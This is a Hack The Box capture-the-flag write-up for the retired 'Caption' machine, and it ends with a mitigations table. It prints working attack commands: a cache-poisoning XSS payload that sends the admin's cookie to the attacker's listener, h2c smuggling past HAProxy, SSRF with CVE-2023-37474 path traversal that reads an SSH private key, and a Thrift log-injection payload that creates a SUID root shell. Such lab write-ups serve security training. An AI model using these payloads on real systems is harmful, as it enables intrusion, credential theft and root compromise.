---
title: "Hack The Box — Caption"
summary: "Caption chains Git history, Varnish cache poisoning, XSS, H2C smuggling, copyparty traversal and Apache Thrift command injection for root access."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Hard"
os: "Linux"
solvedAt: 2026-09-03
publishedAt: 2026-09-03
tags:
  - web-cache-poisoning
  - web-cache-deception
  - xss
  - request-smuggling
  - h2c
  - ssrf
  - path-traversal
  - command-injection
  - linux-privilege-escalation
  - gitbucket
  - varnish
  - haproxy
  - apache-thrift
tools:
  - Nmap
  - Git
  - curl
  - Python
  - h2csmuggler
  - OpenSSH
  - Go
cves:
  - CVE-2023-37474
htbUrl: "https://app.hackthebox.com/machines/Caption"
cover: "/images/writeups/hackthebox/machines/caption/caption.png"
coverAlt: "Hack The Box Caption machine artwork with a green cube inside a red circular frame"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box Caption machine. All commands and credentials belong to that isolated lab. User and root flags, session cookies, private keys, VPN details and unrelated personal data have been removed.

Caption was confirmed as an official [retired Hack The Box machine](https://www.hackthebox.com/machines/caption) on 3 September 2026. You can find the rest of my published lab notes in the [write-ups archive](/writeups/).

## Introduction

Caption is a strong example of why web exploitation rarely stops at one product boundary. The route to the user flag crossed GitBucket, HAProxy, Varnish, a Flask portal, an HTTP/2 cleartext tunnel and an internal copyparty instance. The privilege-escalation path then moved into a root-owned Apache Thrift service whose log parser placed attacker-controlled data inside a shell command.

This article follows my actual solve rather than presenting a shortened official route. I include the patched default-login dead end, the cache-timing issue that initially produced no callback, and the evidence that justified every pivot.

## Official machine description

> Caption is a Hard-difficulty Linux box, showcasing the chaining of niche vulnerabilities arising from different technologies such as HAProxy and Varnish. It begins with default credentials granting access to GitBucket, which exposes credentials for a web portal login through commits. The application caches a frequently visited page by an admin user, whose session can be hijacked by exploiting Web Cache Deception (WCD) via response poisoning exploited through a Cross-Site Scripting (XSS) payload. HAProxy controls can be bypassed by establishing an HTTP/2 cleartext tunnel, also known as an H2C Smuggling Attack, enabling the exploitation of a locally running service vulnerable to path traversal (CVE-2023-37474). A foothold is gained by reading the SSH ECDSA private key. Root privileges are obtained by exploiting a command injection vulnerability in the Apache Thrift service running as root.

Source: [Hack The Box — Caption](https://www.hackthebox.com/machines/caption).

## Machine information

| Item | Value |
| --- | --- |
| Platform | Hack The Box |
| Content type | Machine |
| Difficulty | Hard |
| Operating system | Linux |
| Hostname | `caption.htb` |
| Publication policy | Retired |
| Solve date | 3 September 2026 |

The machine and VPN addresses were session-specific, so the commands below use `<TARGET_IP>` and `<TUN0_IP>` placeholders.

## Executive summary

The public GitBucket instance exposed two repositories. A historical Caption-Portal commit disclosed credentials for `margo`, while the current HAProxy configuration revealed ACLs around `/logs` and `/download`. After authenticating to the portal, I poisoned a Varnish-cached `/firewalls` response through the unkeyed `X-Forwarded-Host` header. The injected XSS executed in the administrator's browser and returned the admin session cookie. I then used h2csmuggler to tunnel through HAProxy to Varnish, reached the restricted download feature, and turned it into SSRF against copyparty on `127.0.0.1:3923`. CVE-2023-37474 disclosed Margo's ECDSA private key and provided SSH access. Finally, a root-owned Apache Thrift service interpolated a parsed `user-agent` value into `/bin/sh -c`; a crafted log created a root-owned SUID Bash copy and completed the compromise.

## Attack path

| Stage | Confirmed result |
| --- | --- |
| Network enumeration | SSH, HAProxy/Varnish and GitBucket exposed |
| Git history review | Recovered the Caption Portal credential |
| Portal authentication | Logged in as `margo` |
| Cache poisoning | Stored attacker-controlled markup in `/firewalls` |
| XSS | Captured an administrator session cookie |
| H2C smuggling | Bypassed HAProxy restrictions for `/logs` and `/download` |
| SSRF and traversal | Reached copyparty and read files outside its share |
| Linux foothold | Stole Margo's ECDSA key and connected over SSH |
| Thrift injection | Executed shell commands in the root service context |
| Privilege escalation | Created a root-owned SUID Bash copy and read the final flag |

## 1. Initial enumeration

I began with a full TCP scan and default scripts/version detection:

```bash
nmap <TARGET_IP> -T5 -sCV -p-
```

The useful results were:

```text
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu
80/tcp   open  http-proxy HAProxy http proxy 2.0.0 or later
8080/tcp open  http       Jetty
|_http-title: GitBucket
```

Port 80 redirected to `caption.htb`, so I added the virtual host and verified both HTTP services:

```bash
echo '<TARGET_IP> caption.htb' | sudo tee -a /etc/hosts

curl -I http://caption.htb
curl -I http://caption.htb:8080
```

Port 80 disclosed the application and cache stack:

```text
HTTP/1.1 200 OK
server: Werkzeug/3.0.1 Python/3.10.12
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
```

Port 8080 returned a Jetty session cookie and the GitBucket interface. The combination of an edge proxy, a cache and a separate source-code platform immediately suggested that configuration review would be as important as directory fuzzing.

## 2. GitBucket source review

The GitBucket dashboard exposed two public repositories without authentication:

- `root/Caption-Portal`
- `root/Logservice`

### Patched default login

I first tried GitBucket's historical `root:root` default. The instance rejected it:

```text
Sorry, your Username and/or Password is incorrect. Please try again.
```

This was a useful dead end. The deployed instance had patched that route, but the repositories themselves remained readable, so brute forcing the login offered no value.

I cloned the portal repository instead:

```bash
git clone http://caption.htb:8080/git/root/Caption-Portal.git
cd Caption-Portal
git log --oneline --all
```

The history contained an especially relevant pair of commits:

```text
8561d67 Fixed HAProxyBypass
0e3bafe Update access control
```

Inspecting the access-control change revealed a deleted HAProxy user list:

```bash
git show 0e3bafe
```

```diff
-userlist AuthUsers
-        user margo insecure-password vFr&cS2#0!
```

The same commit showed that global HTTP authentication had been replaced by explicit denials for two paths:

```diff
 acl restricted_page path_beg,url_dec -i /logs
 acl restricted_page path_beg,url_dec -i /download
-http-request auth unless { http_auth(AuthUsers) }
+http-request deny if restricted_page
```

The leaked lab-only credential was still valid for the portal on port 80:

```text
margo : vFr&cS2#0!
```

It did not authenticate to GitBucket or SSH. Keeping the two applications separate avoided wasting time on the wrong login form.

## 3. Mapping the portal and cache behavior

After logging in as Margo, `/home` and `/firewalls` were accessible, while `/logs` remained blocked. Source and response inspection showed that asset URLs incorporated a `utm_source` value derived from `X-Forwarded-Host`:

```html
<script src="http://caption.htb/static/js/lib.js?utm_source=http://internal-proxy.local"></script>
```

The `/firewalls` response was also publicly cacheable:

```text
cache-control: public, max-age=120
via: 1.1 varnish (Varnish/6.6)
```

This created the vulnerable combination:

1. `X-Forwarded-Host` influenced HTML output.
2. Varnish did not include that header in the cache key.
3. `/firewalls` cached an authenticated response for other visitors.
4. An administrator repeatedly visited the same page.

## 4. Varnish cache poisoning and XSS

I extracted Margo's portal cookie in the browser and stored it locally. The real JWT is omitted:

```bash
export COOKIE='session=<MARGO_SESSION_REDACTED>'
export LHOST='<TUN0_IP>'
```

In a second terminal I started an HTTP listener for the browser callback:

```bash
sudo python3 -m http.server 80
```

The Varnish configuration supported the custom `XCGFULLBAN` method, which cleared the current cache:

```bash
curl -i -X XCGFULLBAN http://caption.htb/
```

```text
HTTP/1.1 200 Full cache cleared
server: Varnish
```

I then supplied an `X-Forwarded-Host` value that closed the existing script element, inserted an image with an `onerror` handler, and reopened the expected markup:

```bash
curl -i \
  -H "Cookie: $COOKIE" \
  -H "X-Forwarded-Host: xss\"></script><img src=x onerror=\"location='http://$LHOST/?cookie='+document.cookie\"><script src=\"" \
  http://caption.htb/firewalls
```

The response confirmed that the injected element had entered a cacheable object:

```text
HTTP/1.1 200 OK
cache-control: public, max-age=120
age: 0
x-cache: MISS
```

```html
<script src="http://caption.htb/static/js/lib.js?utm_source=http://xss"></script>
<img src=x onerror="location='http://<TUN0_IP>/?cookie='+document.cookie">
<script src=""></script>
```

### Cache timing issue

My first follow-up appeared to do nothing. A later response showed `age: 110` and no `X-Cache` marker, meaning the 120-second object was almost stale and had already received additional hits. I repeated the purge and poison sequence, then immediately requested `/firewalls` again to produce the first cache hit:

```bash
curl -si \
  -H "Cookie: $COOKIE" \
  http://caption.htb/firewalls | head -n 15
```

The listener received three requests from the target containing the administrator's session JWT:

```text
<TARGET_IP> - - "GET /?cookie=session=<ADMIN_SESSION_REDACTED> HTTP/1.1" 200 -
```

Decoding the JWT payload confirmed the role-bearing identity:

```json
{"username":"admin","exp":"<REDACTED>"}
```

The cookie was the authorization layer needed by the backend application, but direct requests to `/logs` and `/download` were still denied at HAProxy.

## 5. Bypassing HAProxy with an H2C tunnel

I installed Bishop Fox's `h2csmuggler` in an isolated Python environment:

```bash
cd ~/Documents/HackTheBox/Caption
git clone https://github.com/BishopFox/h2csmuggler.git
cd h2csmuggler

python3 -m venv .venv
source .venv/bin/activate
pip install h2
```

The attack works because HAProxy forwards an HTTP/1.1 h2c upgrade to an h2c-capable backend. Once the backend switches protocols, the HTTP/2 stream becomes a tunnel that is no longer subject to the frontend's per-request path ACLs.

With the stolen cookie redacted, I requested the restricted log page through the internal Varnish listener:

```bash
export ADMIN_COOKIE='session=<ADMIN_SESSION_REDACTED>'

python3 h2csmuggler.py \
  -x http://caption.htb \
  -H "Cookie: $ADMIN_COOKIE" \
  http://127.0.0.1:6081/logs
```

The output proved both the protocol switch and the ACL bypass:

```text
[INFO] h2c stream established successfully.
[INFO] Requesting - /logs
:status: 200
server: Werkzeug/3.0.1 Python/3.10.12
via: 1.1 varnish (Varnish/6.6)
```

The HTML exposed four download links:

```text
/download?url=http://127.0.0.1:3923/ssh_logs
/download?url=http://127.0.0.1:3923/fw_logs
/download?url=http://127.0.0.1:3923/zk_logs
/download?url=http://127.0.0.1:3923/hadoop_logs
```

The `url` parameter showed that `/download` fetched a caller-supplied URL on the server side. The destinations also disclosed a service bound to `127.0.0.1:3923`.

## 6. SSRF to copyparty and CVE-2023-37474

Requesting the local service through `/download` identified it as copyparty. Vulnerable copyparty versions before 1.8.2 exposed arbitrary paths below the special `.cpr` route. Because the request crossed multiple decoding layers, the encoded slash had to be encoded twice: `%2F` became `%252F`.

I validated the traversal against `/etc/passwd`:

```bash
python3 h2csmuggler.py \
  -x http://caption.htb \
  -H "Cookie: $ADMIN_COOKIE" \
  'http://127.0.0.1:6081/download?url=http://127.0.0.1:3923/.cpr/%252Fetc%252Fpasswd'
```

The response contained the operating-system account list:

```text
root:x:0:0:root:/root:/bin/bash
margo:x:1000:1000:,,,:/home/margo:/bin/bash
ruth:x:1001:1001:,,,:/home/ruth:/bin/bash
```

After confirming Margo's home directory, I requested the ECDSA key rather than assuming an RSA filename:

```bash
python3 h2csmuggler.py \
  -x http://caption.htb \
  -H "Cookie: $ADMIN_COOKIE" \
  'http://127.0.0.1:6081/download?url=http://127.0.0.1:3923/.cpr/%252Fhome%252Fmargo%252F.ssh%252Fid_ecdsa'
```

```text
-----BEGIN OPENSSH PRIVATE KEY-----
[PRIVATE KEY MATERIAL REMOVED]
-----END OPENSSH PRIVATE KEY-----
```

I reran the request and extracted only the PEM block:

```bash
python3 h2csmuggler.py \
  -x http://caption.htb \
  -H "Cookie: $ADMIN_COOKIE" \
  'http://127.0.0.1:6081/download?url=http://127.0.0.1:3923/.cpr/%252Fhome%252Fmargo%252F.ssh%252Fid_ecdsa' \
  2>/dev/null |
awk '/-----BEGIN OPENSSH PRIVATE KEY-----/{save=1} save; /-----END OPENSSH PRIVATE KEY-----/{exit}' \
  > ../margo_key

chmod 600 ../margo_key
ssh-keygen -y -f ../margo_key >/dev/null && echo '[+] Valid SSH key'
```

```text
[+] Valid SSH key
```

## 7. SSH foothold as Margo

The recovered key authenticated successfully:

```bash
ssh -i ../margo_key margo@caption.htb
```

```text
Welcome to Ubuntu 22.04.4 LTS
margo@caption:~$
```

The home directory contained the first proof file:

```bash
ls
cat user.txt
```

```text
app  copyparty-sfx.py  gitbucket.war  logs  user.txt
[USER FLAG REMOVED]
```

`sudo -l` required a password and three guesses failed. No valid sudo path was established, so I returned to the `Logservice` source discovered in GitBucket.

## 8. Reviewing the root-owned Apache Thrift service

The Go service exposed one RPC method:

```text
service LogService {
    string ReadLogFile(1: string filePath)
}
```

The server listened on TCP 9090, opened the caller-supplied file, extracted an IP address and the value of a JSON-like `user-agent` field, and built a command shaped like:

```text
echo 'IP Address: <IP>, User-Agent: <USER_AGENT>, Timestamp: <TIME>' >> output.log
```

It then passed that string to `/bin/sh -c`. The IP regex was restrictive, but the user-agent capture accepted any characters up to the next double quote. A single quote in that field could therefore terminate the `echo` string and append a new command.

The service was local-only, so I copied its generated Go client to Kali and compiled it there:

```bash
cd ~/Documents/HackTheBox/Caption

scp -r -i margo_key \
  margo@caption.htb:/usr/local/go/src/log_service .

cd log_service
go mod init log_service
go mod tidy
go build -o client ./log_service-remote/log_service-remote.go
file client
```

The build succeeded after downloading the Apache Thrift Go dependency:

```text
go: found github.com/apache/thrift/lib/go/thrift in github.com/apache/thrift v0.24.0
client: ELF 64-bit LSB executable, x86-64 ... with debug_info, not stripped
```

The exact tunnel command was not preserved in the terminal captures, so this transition is reconstructed from the working client and the resulting root-owned SUID file. The required local port forward was:

```bash
ssh -i ../margo_key \
  -f -N \
  -L 127.0.0.1:9090:127.0.0.1:9090 \
  margo@caption.htb
```

## 9. Command injection and root

On Caption, I created a log entry whose `user-agent` closed the quoted string, copied Bash to `/tmp/rootbash`, set the SUID bit and commented out the rest of the intended command:

```bash
printf '%s\n' \
  "{\"user-agent\":\"'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #\", \"ip\":\"1.2.3.4\"}" \
  > /tmp/pwnz.log

cat /tmp/pwnz.log
```

```json
{"user-agent":"'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #", "ip":"1.2.3.4"}
```

The client then invoked the root service's `ReadLogFile` method. This invocation was not preserved as a separate terminal capture, but its effect was confirmed by the root-owned file shown immediately afterward:

```bash
./client 'ReadLogFile' '/tmp/pwnz.log'
```

The final filesystem state confirmed execution in the privileged service context:

```bash
ls -l /tmp/rootbash
```

```text
-rwsr-xr-x 1 root root 1396520 Sep  3 20:16 /tmp/rootbash
```

Bash normally drops mismatched effective privileges. Its `-p` option preserved the SUID-derived effective UID:

```bash
/tmp/rootbash -p
cd /root
ls
cat root.txt
```

```text
rootbash-5.1#
go  go.mod  go.sum  output.log  root.txt  server.go
[ROOT FLAG REMOVED]
```

The `rootbash-5.1#` prompt and access to `/root/root.txt` confirmed effective root access. After validation, the temporary SUID binary and malicious log should be removed before resetting the lab:

```bash
rm -f /tmp/rootbash /tmp/pwnz.log
```

## What did not work

| Attempt | Result | Decision |
| --- | --- | --- |
| GitBucket `root:root` | Rejected by the patched instance | Used the still-public repositories instead |
| Margo credential against GitBucket | Wrong application and trust boundary | Used it on the Caption Portal at port 80 |
| Initial cache-poison wait | No callback; cached object reached `age: 110` | Purged and repeated within the 120-second TTL |
| Direct `/logs` access | Blocked by HAProxy ACL | Established an h2c tunnel to the backend |
| `sudo -l` | No usable password or sudo rule | Audited the root-owned Thrift service |

## Key takeaways

- Historical source is part of the attack surface. Deleting a password or replacing an ACL does not remove it from Git history.
- Cache keys must include every request value that changes a response. Here, an unkeyed `X-Forwarded-Host` converted reflected markup into cross-user stored XSS.
- Authentication and edge authorization are separate controls. The admin cookie satisfied Flask, while h2c smuggling bypassed HAProxy's path checks.
- SSRF impact depends on the internal services it can reach. A download helper became arbitrary file read when chained with vulnerable copyparty.
- Private-key filenames should be enumerated rather than assumed; the useful key was `id_ecdsa`, not `id_rsa`.
- Shelling out to format logs is unnecessary and dangerous. The root service turned a regex-captured field into command injection by passing it to `/bin/sh -c`.
- Timing is evidence. Varnish's `age`, `X-Cache` and TTL headers explained why the first XSS attempt appeared silent.

## Mitigations

| Weakness | Defensive action |
| --- | --- |
| Credential in Git history | Rotate exposed secrets and remove them with a coordinated history rewrite |
| Public source repositories | Require authentication and apply least-privilege repository visibility |
| Untrusted forwarded headers | Accept them only from trusted reverse proxies and validate allowed host values |
| Unsafe shared cache | Do not cache authenticated responses; key on all response-varying inputs |
| H2C smuggling | Strip or reject untrusted `Upgrade`, `Connection` and `HTTP2-Settings` headers at the edge |
| SSRF in `/download` | Use a strict destination allowlist and block loopback, link-local and private ranges after resolution |
| CVE-2023-37474 | Upgrade copyparty to version 1.8.2 or later |
| Private-key disclosure | Restrict file-service scope, rotate the exposed key and use passphrases where practical |
| Thrift command injection | Write logs with native Go file APIs; never concatenate parsed data into `/bin/sh -c` |
| Root-owned network service | Drop privileges and bind only where necessary, with authenticated RPC access |

## Tools used

- **Nmap** — full TCP and service enumeration
- **Git** — cloned GitBucket repositories and reviewed historical commits
- **curl** — verified headers, purged Varnish and delivered the poisoned response
- **Python** — isolated `h2csmuggler` environment and HTTP callback listener
- **h2csmuggler** — established the HTTP/2 cleartext tunnel through HAProxy
- **OpenSSH** — authenticated with the recovered key and forwarded port 9090
- **Go** — compiled the generated Apache Thrift client
- **ssh-keygen** — validated the extracted ECDSA private key

## References

- [Hack The Box — Caption](https://www.hackthebox.com/machines/caption)
- [Hack The Box streaming and write-up guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)
- [Bishop Fox — H2C Smuggling: Request Smuggling via HTTP/2 Cleartext](https://bishopfox.com/blog/h2c-smuggling-request)
- [BishopFox h2csmuggler](https://github.com/BishopFox/h2csmuggler)
- [CVE-2023-37474: copyparty directory traversal](https://security.snyk.io/vuln/SNYK-PYTHON-COPYPARTY-5777718)
- [Apache Thrift Go tutorial](https://thrift.apache.org/tutorial/go.html)
- [MDN — X-Forwarded-Host](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Forwarded-Host)
